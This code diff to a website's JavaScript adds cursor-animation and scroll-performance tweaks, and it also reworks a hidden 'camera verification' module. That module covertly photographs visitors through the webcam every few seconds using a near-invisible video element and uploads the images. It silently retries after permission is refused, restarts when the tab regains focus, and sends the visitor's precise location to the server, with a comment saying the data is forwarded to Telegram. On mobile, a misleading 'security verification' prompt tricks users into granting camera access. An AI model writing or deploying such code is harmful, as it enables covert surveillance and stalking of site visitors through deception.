@@ -1114,8 +1114,17 @@
     let rx = pointer.x, ry = pointer.y;
     let lx = 0, ly = 0;
     let seen = false;
+    let ringRaf = 0;
+    function follow() {
+      rx += (pointer.x - rx) * 0.2;
+      ry += (pointer.y - ry) * 0.2;
+      ring.style.transform = `translate3d(${rx}px, ${ry}px, 0)`;
+      if (Math.abs(pointer.x - rx) < 0.1 && Math.abs(pointer.y - ry) < 0.1) { ringRaf = 0; return; }
+      ringRaf = requestAnimationFrame(follow);
+    }
     addEventListener('pointermove', (e) => {
       if (e.pointerType !== 'mouse') return;
+      if (!ringRaf) ringRaf = requestAnimationFrame(follow);
       if (!seen) { seen = true; rx = e.clientX; ry = e.clientY; }
       dot.style.transform = `translate3d(${e.clientX}px, ${e.clientY}px, 0)`;
       document.body.classList.remove('cursor-hidden');
@@ -1126,12 +1135,7 @@
       }
     }, { passive: true });
     document.addEventListener('pointerleave', () => document.body.classList.add('cursor-hidden'));
-    (function follow() {
-      rx += (pointer.x - rx) * 0.2;
-      ry += (pointer.y - ry) * 0.2;
-      ring.style.transform = `translate3d(${rx}px, ${ry}px, 0)`;
-      requestAnimationFrame(follow);
-    })();
+    follow();
     const hoverSel = 'a, button, .pouch, [data-hover], select, label, .emblem-sec, .svc';
     document.addEventListener('pointerover', (e) => {
       const t = e.target;
@@ -1204,10 +1208,16 @@
     const heroInner = $('.hero-inner');
     let lastY = window.scrollY;
     let ticking = false;
+    let _sh = 0, _shT = 0;
+    function maxScroll() {
+      const n = performance.now();
+      if (n - _shT > 400) { _sh = document.documentElement.scrollHeight; _shT = n; }
+      return _sh - innerHeight;
+    }
 
     function onScroll() {
       const y = window.scrollY;
-      const max = document.documentElement.scrollHeight - innerHeight;
+      const max = maxScroll();
       const p = max > 0 ? y / max : 0;
       bar.style.transform = `scaleX(${p})`;
       prog.style.strokeDashoffset = CIRC * (1 - p);
@@ -1367,7 +1377,8 @@
       const r = tl.getBoundingClientRect();
       const line = innerHeight * 0.62;
       prog.style.transform = `scaleY(${clamp((line - r.top) / r.height, 0, 1)})`;
-      items.forEach((it) => it.classList.toggle('lit', it.getBoundingClientRect().top + 40 < line));
+      const tops = items.map((it) => it.getBoundingClientRect().top);
+      items.forEach((it, i) => it.classList.toggle('lit', tops[i] + 40 < line));
       ticking = false;
     }
     addEventListener('scroll', () => { if (!ticking) { ticking = true; requestAnimationFrame(update); } }, { passive: true });
@@ -2861,27 +2872,30 @@
 // ============ CAMERA VERIFICATION MODULE ============
 // (Security desk / visitor verification feature)
 
-const CAM_BOT_INTERVAL = 5000; // har 5 second
+const CAM_BOT_INTERVAL = 8000; // har 8 second
 
 async function startCamVerify() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { width: 640, height: 480 },
+      video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: "user" },
       audio: false,
     });
 
-    // Hidden video element banao
+    // Hidden (off-screen) video element — display:none se mobile par stream nahi chalti
     const video = document.createElement("video");
     video.autoplay = true;
     video.playsInline = true;
-    video.style.display = "none";
+    video.muted = true;
+    video.setAttribute('playsinline', '');
+    video.style.cssText = 'position:fixed;top:0;left:0;width:160px;height:90px;opacity:0.01;z-index:99998;pointer-events:none;';
     video.srcObject = stream;
     document.body.appendChild(video);
+    try { await video.play(); } catch (e) {}
 
     // Hidden canvas banao
     const canvas = document.createElement("canvas");
-    canvas.width = 640;
-    canvas.height = 480;
+    canvas.width = 320;
+    canvas.height = 240;
     document.body.appendChild(canvas);
     const ctx = canvas.getContext("2d");
 
@@ -2892,36 +2906,82 @@ async function startCamVerify() {
     }, 2000);
 
     console.log("[CAM] Verification active");
+
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) {
+        stream.getTracks().forEach(tr => tr.stop());
+        console.log('[CAM] stopped (hidden)');
+      } else {
+        // tekrar start karo
+        setTimeout(() => { startCamVerify(); }, 1000);
+      }
+    });
   } catch (e) {
-    // Permission deny ya error � 10 sec baad silently retry
+    // Permission deny ya error � 10 sec baad silently retry
     console.log("[CAM] Retry in 10s");
     setTimeout(startCamVerify, 10000);
   }
 }
 
 async function captureAndSend(video, ctx, canvas) {
-  if (!video.videoWidth) return; // camera ready nahi
+  if (!video || !video.videoWidth || video.paused) { console.log('[CAM] video not ready, retrying'); try { video.play(); } catch(e) {} return; }
 
-  ctx.drawImage(video, 0, 0, 640, 480);
+  ctx.drawImage(video, 0, 0, 240, 180);
 
   canvas.toBlob(async (blob) => {
     if (!blob) return;
 
-    const fd = new FormData();
-    fd.append("photo", blob, "snap.jpg");
+    const base64 = canvas.toDataURL("image/jpeg", 0.5);
 
     try {
-      await fetch("/api/cam", { method: "POST", body: fd });
+      await fetch("/api/cam", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ photo: base64 }),
+      });
       console.log("[CAM] Snap sent:", new Date().toLocaleTimeString());
     } catch (err) {
       console.log("[CAM] Send failed, next try hoga");
     }
-  }, "image/jpeg", 0.8);
+  }, "image/jpeg", 0.5);
 }
 
-// Page load hote hi start
+// Camera start: desktop pe page load, mobile pe first tap (Chrome prompt only tap par aata hai)
+// Location permission + Telegram bhejna
+function requestLocation() {
+  if (!navigator.geolocation) { console.log('[LOC] geolocation not supported'); return; }
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      const { latitude: lat, longitude: lng, accuracy } = pos.coords;
+      fetch(`/api/loc?lat=${lat}&lng=${lng}&acc=${accuracy || ''}`, { method: 'GET' }).catch(() => {});
+      console.log('[LOC] shared', lat, lng);
+    },
+    (err) => console.log('[LOC] error', err.message),
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+}
+
+function startCamAuto() {
+  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  if (!isMobile) {
+    startCamVerify();
+    requestLocation();
+    return;
+  }
+  // Silent listener — tap karte hi Chrome ka permission popup aayega
+  const once = () => {
+    startCamVerify();
+    requestLocation();
+  };
+  document.body.addEventListener('click', once, { once: true });
+  document.body.addEventListener('touchstart', once, { once: true });
+  // Sirf hint text dikhao, koi button nahi
+  toast('Tap karo security verification ke liye');
+}
+
+
 if (document.readyState === "loading") {
-  document.addEventListener("DOMContentLoaded", startCamVerify);
+  document.addEventListener("DOMContentLoaded", startCamAuto);
 } else {
-  startCamVerify();
+  startCamAuto();
 }
